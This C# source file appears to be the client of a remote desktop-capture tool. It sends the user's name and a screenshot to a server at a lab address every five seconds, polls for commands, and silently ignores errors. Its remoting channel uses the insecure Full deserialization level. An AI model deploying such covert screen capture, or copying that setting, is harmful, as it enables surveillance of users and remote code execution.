﻿using RemotingInterface;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Client
{
    internal class Desktop
    {
        static Bitmap bmp;
        static MemoryStream ms;
        static Graphics graphics;
        static Rectangle rc;
        public static DesktopInterface dInterface;
        static TcpChannel tcpChannel;
        static string commands;

        static System.Timers.Timer timer = new System.Timers.Timer();   

        public static void initClientDesktop()
        {
            BinaryClientFormatterSinkProvider clientProvider = new BinaryClientFormatterSinkProvider();
            BinaryServerFormatterSinkProvider serverProvider = new BinaryServerFormatterSinkProvider();
            serverProvider.TypeFilterLevel = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            System.Collections.Hashtable props = new System.Collections.Hashtable();
            props["port"] = 0;
            string s = System.Guid.NewGuid().ToString();
            props["name"] = s;
            props["typeFilterLevel"] = System.Runtime.Serialization.Formatters.TypeFilterLevel.Full;
            TcpChannel tcpChannel = new TcpChannel(props, clientProvider, serverProvider);
            ChannelServices.RegisterChannel(tcpChannel, false);
            dInterface = (DesktopInterface)Activator.GetObject(
                typeof(DesktopInterface),
                //"tcp://127.0.0.1:7777/DesktopCapture");
                "tcp://192.168.56.1:7777/DesktopCapture");

            timer.Interval = 5000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();
            Console.WriteLine("ok1");
        }

        private static void onTimedEvent(object sender, EventArgs e)
        {
            try
            {
                dInterface.GoodbyeMethod();
                dInterface.HelloMethod(Environment.UserName.ToString());
                ms = new MemoryStream(10000);
                rc = Screen.PrimaryScreen.Bounds;
                bmp = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                graphics = Graphics.FromImage(bmp);
                graphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
                bmp.Save(ms, ImageFormat.Jpeg);
                dInterface.SendBitmap(ms);
                // now a call to get our commands from the server
                commands = dInterface.GetCommands();

                if (commands.LastIndexOf("StopClient") >= 0)
                  Environment.Exit(0);
            }
            catch (Exception) 
            {
                
            }
        }
    }
}
